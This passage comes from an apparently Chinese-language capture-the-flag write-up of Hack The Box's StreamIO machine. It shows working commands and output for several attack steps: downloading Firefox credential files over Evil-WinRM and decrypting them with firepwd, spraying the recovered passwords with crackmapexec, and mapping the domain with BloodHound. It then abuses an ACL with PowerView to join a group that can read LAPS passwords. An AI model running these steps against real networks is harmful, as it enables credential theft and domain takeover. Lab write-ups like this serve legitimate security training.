class="hljs-number">42</span> AM                sessionstore-backups<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM                storage<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM             <span class="hljs-number">24</span> addons.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM           <span class="hljs-number">5189</span> addonStartup.json.lz4<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM            <span class="hljs-number">310</span> AlternateServices.txt<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">41</span> AM         <span class="hljs-number">229376</span> cert9.db<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM            <span class="hljs-number">208</span> compatibility.ini<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM            <span class="hljs-number">939</span> containers.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM         <span class="hljs-number">229376</span> content-prefs.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM          <span class="hljs-number">98304</span> cookies.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM           <span class="hljs-number">1081</span> extension-preferences.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM          <span class="hljs-number">43726</span> extensions.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM        <span class="hljs-number">5242880</span> favicons.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">41</span> AM         <span class="hljs-number">262144</span> formhistory.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM            <span class="hljs-number">778</span> handlers.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM         <span class="hljs-number">294912</span> key4.db<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">41</span> AM           <span class="hljs-number">1593</span> logins-backup.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">41</span> AM           <span class="hljs-number">2081</span> logins.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM              <span class="hljs-number">0</span> parent.lock<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM          <span class="hljs-number">98304</span> permissions.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM            <span class="hljs-number">506</span> pkcs11.txt<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM        <span class="hljs-number">5242880</span> places.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM           <span class="hljs-number">8040</span> prefs.js<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM            <span class="hljs-number">180</span> search.json.mozlz4<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM            <span class="hljs-number">288</span> sessionCheckpoints.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM           <span class="hljs-number">1853</span> sessionstore.jsonlz4<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM             <span class="hljs-number">18</span> shield-preference-experiments.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM            <span class="hljs-number">611</span> SiteSecurityServiceState.txt<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM           <span class="hljs-number">4096</span> storage.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM             <span class="hljs-number">50</span> times.json<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM          <span class="hljs-number">98304</span> webappsstore.sqlite<br>-a----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM            <span class="hljs-number">141</span> xulstore.json<br><br><br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release&gt;<br><br><br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release&gt; download logins.json<br>                                        <br>Info: Downloading C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release\logins.json to logins.json<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release&gt; download key4.db<br>                                        <br>Info: Downloading C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release\key4.db to key4.db<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release&gt;<br><br></code></pre></td></tr></table></figure>

<p>28、这里解密的时候，涉及到Python的3方库存在过期的问题，导致一直提示缺少某个库，修改了下以下代码后，成功解密出来火狐的密码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c">https:<span class="hljs-comment">//github.com/lclevy/firepwd</span><br><br>from Cryptodome.Cipher import DES3, AES<br>from Cryptodome.Util.number import long_to_bytes<br>from Cryptodome.Util.Padding import unpad   <br><br>主要修改了上述的三方库的导入。<br><br><br>shiyan@InfoSec firepwd-master % python3 firepwd.py -d ./mozilla_db/<br>globalSalt: b<span class="hljs-number">&#x27;</span>d215c391179edb56af928a06c627906bcbd4bd47<span class="hljs-number">&#x27;</span><br> SEQUENCE &#123;<br>   SEQUENCE &#123;<br>     OBJECTIDENTIFIER <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113549</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span><span class="hljs-number">.13</span> pkcs5 pbes2<br>     SEQUENCE &#123;<br>       SEQUENCE &#123;<br>         OBJECTIDENTIFIER <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113549</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span><span class="hljs-number">.12</span> pkcs5 PBKDF2<br>         SEQUENCE &#123;<br>           OCTETSTRING b<span class="hljs-number">&#x27;5</span>d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5<span class="hljs-number">&#x27;</span><br>           INTEGER b<span class="hljs-number">&#x27;01&#x27;</span><br>           INTEGER b<span class="hljs-number">&#x27;20&#x27;</span><br>           SEQUENCE &#123;<br>             OBJECTIDENTIFIER <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113549</span><span class="hljs-number">.2</span><span class="hljs-number">.9</span> hmacWithSHA256<br>           &#125;<br>         &#125;<br>       &#125;<br>       SEQUENCE &#123;<br>         OBJECTIDENTIFIER <span class="hljs-number">2.16</span><span class="hljs-number">.840</span><span class="hljs-number">.1</span><span class="hljs-number">.101</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.42</span> aes256-CBC<br>         OCTETSTRING b<span class="hljs-number">&#x27;1b</span>aafcd931194d48f8ba5775a41f<span class="hljs-number">&#x27;</span><br>       &#125;<br>     &#125;<br>   &#125;<br>   OCTETSTRING b<span class="hljs-number">&#x27;12e56</span>d1c8458235a4136b280bd7ef9cf<span class="hljs-number">&#x27;</span><br> &#125;<br>clearText b<span class="hljs-number">&#x27;70617373776f</span>72642d636865636b0202<span class="hljs-number">&#x27;</span><br>password check? True<br> SEQUENCE &#123;<br>   SEQUENCE &#123;<br>     OBJECTIDENTIFIER <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113549</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span><span class="hljs-number">.13</span> pkcs5 pbes2<br>     SEQUENCE &#123;<br>       SEQUENCE &#123;<br>         OBJECTIDENTIFIER <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113549</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span><span class="hljs-number">.12</span> pkcs5 PBKDF2<br>         SEQUENCE &#123;<br>           OCTETSTRING b<span class="hljs-number">&#x27;098560</span>d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e<span class="hljs-number">&#x27;</span><br>           INTEGER b<span class="hljs-number">&#x27;01&#x27;</span><br>           INTEGER b<span class="hljs-number">&#x27;20&#x27;</span><br>           SEQUENCE &#123;<br>             OBJECTIDENTIFIER <span class="hljs-number">1.2</span><span class="hljs-number">.840</span><span class="hljs-number">.113549</span><span class="hljs-number">.2</span><span class="hljs-number">.9</span> hmacWithSHA256<br>           &#125;<br>         &#125;<br>       &#125;<br>       SEQUENCE &#123;<br>         OBJECTIDENTIFIER <span class="hljs-number">2.16</span><span class="hljs-number">.840</span><span class="hljs-number">.1</span><span class="hljs-number">.101</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.42</span> aes256-CBC<br>         OCTETSTRING b<span class="hljs-number">&#x27;e28</span>a1fe8bcea476e94d3a722dd96<span class="hljs-number">&#x27;</span><br>       &#125;<br>     &#125;<br>   &#125;<br>   OCTETSTRING b<span class="hljs-number">&#x27;51b</span>a44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266<span class="hljs-number">&#x27;</span><br> &#125;<br>clearText b<span class="hljs-number">&#x27;b</span>3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808<span class="hljs-number">&#x27;</span><br>decrypting login/password pairs<br>https:<span class="hljs-comment">//slack.streamio.htb:b&#x27;admin&#x27;,b&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span><br>https:<span class="hljs-comment">//slack.streamio.htb:b&#x27;nikk37&#x27;,b&#x27;n1kk1sd0p3t00:)&#x27;</span><br>https:<span class="hljs-comment">//slack.streamio.htb:b&#x27;yoshihide&#x27;,b&#x27;paddpadd@12&#x27;</span><br>https:<span class="hljs-comment">//slack.streamio.htb:b&#x27;JDgodd&#x27;,b&#x27;password@12&#x27;</span><br></code></pre></td></tr></table></figure>

<p>29、这里得到一些密码后，继续进行密码喷洒下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">admin<br>nikk37<br>yoshihide<br>JDgodd<br><br>JDg0dd1s@d0p3cr3@t0r<br>n1kk1sd0p3t00:)<br>paddpadd@<span class="hljs-number">12</span><br>password@<span class="hljs-number">12</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -u users.txt -p password.txt --<span class="hljs-keyword">continue</span>-on-success  <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\admin:paddpadd@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\admin:password@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] Connection Error: The NETBIOS connection with the remote host timed out.<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\nikk37:paddpadd@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\nikk37:password@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:paddpadd@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:password@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\JDgodd:paddpadd@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\JDgodd:password@<span class="hljs-number">12</span> STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>

<p>30、但是上面获取的账号，在手工枚举阶段没有发现了什么有效的信息，那就直接域枚举吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ bloodhound-python -u JDgodd -p <span class="hljs-string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> -d streamIO.htb -ns <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -c all --zip<br>INFO: Found AD domain: streamio.htb<br>INFO: Getting TGT <span class="hljs-keyword">for</span> user<br>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br>INFO: Connecting to LDAP server: dc.streamio.htb<br>INFO: Found <span class="hljs-number">1</span> domains<br>INFO: Found <span class="hljs-number">1</span> domains in the forest<br>INFO: Found <span class="hljs-number">1</span> computers<br>INFO: Connecting to LDAP server: dc.streamio.htb<br>INFO: Found <span class="hljs-number">8</span> users<br>INFO: Found <span class="hljs-number">54</span> groups<br>INFO: Found <span class="hljs-number">4</span> gpos<br>INFO: Found <span class="hljs-number">1</span> ous<br>INFO: Found <span class="hljs-number">19</span> containers<br>INFO: Found <span class="hljs-number">0</span> trusts<br>INFO: Starting computer enumeration with <span class="hljs-number">10</span> workers<br>INFO: Querying computer: DC.streamIO.htb<br>WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.<br>WARNING: DCE/RPC connection failed: [Errno Connection <span class="hljs-title function_">error</span> <span class="hljs-params">(<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">445</span>)</span>] timed out<br>WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.<br>WARNING: DCE/RPC connection failed: [Errno Connection <span class="hljs-title function_">error</span> <span class="hljs-params">(<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>:<span class="hljs-number">445</span>)</span>] timed out<br>WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.<br>INFO: Done in 07M 26S<br>INFO: Compressing output into 20240412222023_bloodhound.zip<br></code></pre></td></tr></table></figure>

<p>31、登录bloodhund 工具，清理历史数据后，再上传最新的数据发现了存在一个可利用的漏洞</p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/20.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/21.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="http://sh1yan.top/photo/StreamIO-htb-writeup/22.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">Help: ReadLAPSPassword<br><br>CORE小组的成员STAFF@STREAMIO.HTB能够读取由计算机DC上的本地管理员密码解决方案（LAPS）设置的密码。STREAMIO。HTB。<br><br>由LAPS管理的计算机的本地管理员密码存储在机密LDAP属性“ms-mcs-AmpPwd”中。<br><br>这里也提供了读取的方法：<br><br>当计算机的本地管理员帐户凭据由LAPS控制时，可以充分控制计算机对象。本地管理员帐户的明文密码存储在名为ms-Mcs AdmPwd的计算机对象的扩展属性中。<br><br>pyLAPS可用于检索LAPS密码：<br><br>https:<span class="hljs-comment">//github.com/p0dalirius/pyLAPS</span><br></code></pre></td></tr></table></figure>

<p>32、那就按照提示开始枚举吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 pyLAPS.py --action get -d <span class="hljs-string">&quot;streamIO.htb&quot;</span> -u <span class="hljs-string">&quot;JDgodd&quot;</span> -p <span class="hljs-string">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span> --dc-ip <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span><br>                 __    ___    ____  _____<br>    ____  __  __/ /   /   |  / __ \/ ___/<br>   / __ \/ / / / /   / /| | / /_/ /\__ \   <br>  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   <br> / .___/\__, /_____/_/  |_/_/    /____/    v1<span class="hljs-number">.2</span><br>/_/    /____/           @podalirius_           <br>    <br>[+] Extracting LAPS passwords of all computers ... <br>[+] All done!<br></code></pre></td></tr></table></figure>

<p>33、但是，可能是权限的问题吧，就是获取不到任何一个密码结果，突然想到，是不是我漏了一个环节，我对该组拥有写入权限，但是我当前的账号并不在组里，我需要添加一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; cd C:/<br>*Evil-WinRM* PS C:\&gt; ls<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">4</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">8</span>:<span class="hljs-number">19</span> AM                Downloads<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">51</span> AM                inetpub<br>d-----        <span class="hljs-number">3</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">4</span>:<span class="hljs-number">46</span> PM                PerfLogs<br>d-r---        <span class="hljs-number">3</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">53</span> PM                Program Files<br>d-----         <span class="hljs-number">5</span>/<span class="hljs-number">9</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span>:<span class="hljs-number">36</span> PM                Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span><br>d-r---        2/22/2022   2:48 AM                Users<br>d-----         5/9/2022   5:38 PM                Windows<br><br><br>*Evil-WinRM* PS C:\&gt; cd Downloads<br>*Evil-WinRM* PS C:\Downloads&gt; ls<br><br><br>    Directory: C:\Downloads<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        4/12/2024   3:21 AM         181656 lazagne.exe<br>-a----        4/12/2024   8:22 AM         770279 PowerView.ps1<br>-a----        4/12/2024   6:55 AM          51712 runascs.exe<br><br><br>*Evil-WinRM* PS C:\Downloads&gt; Import-Module .\PowerView.ps1<br>*Evil-WinRM* PS C:\Downloads&gt; $SecPassword = ConvertTo-SecureString <span class="hljs-string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> -AsPlainText -Force<br>*Evil-WinRM* PS C:\Downloads&gt; $Cred = New-Object System.Management.Automation.PSCredential(<span class="hljs-string">&#x27;streamio.htb\JDgodd&#x27;</span>, $SecPassword)<br>*Evil-WinRM* PS C:\Downloads&gt; Set-DomainObjectOwner -Identity <span class="hljs-string">&#x27;CORE STAFF&#x27;</span> -OwnerIdentity <span class="hljs-string">&quot;streamio\JDgodd&quot;</span> -Cred $cred<br>*Evil-WinRM* PS C:\Downloads&gt; Add-DomainObjectAcl -TargetIdentity <span class="hljs-string">&quot;CORE STAFF&quot;</span> -PrincipalIdentity <span class="hljs-string">&quot;streamio\JDgodd&quot;</span> -Cred $cred -Rights All<br>*Evil-WinRM* PS C:\Downloads&gt; Add-DomainGroupMember -Identity <span class="hljs-string">&#x27;CORE STAFF&#x27;</span> -Members <span class="hljs-string">&#x27;streamio\JDgodd&#x27;</span> -Cred $cred<br>*Evil-WinRM* PS C:\Downloads&gt; Get-DomainGroupMember -Identity <span class="hljs-string">&#x27;Core Staff&#x27;</span><br><br><br>GroupDomain             : streamIO.htb<br>GroupName               : CORE STAFF<br>GroupDistinguishedName  : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb<br>MemberDomain            : streamIO.htb<br>MemberName              : JDgodd<br>MemberDistinguishedName : 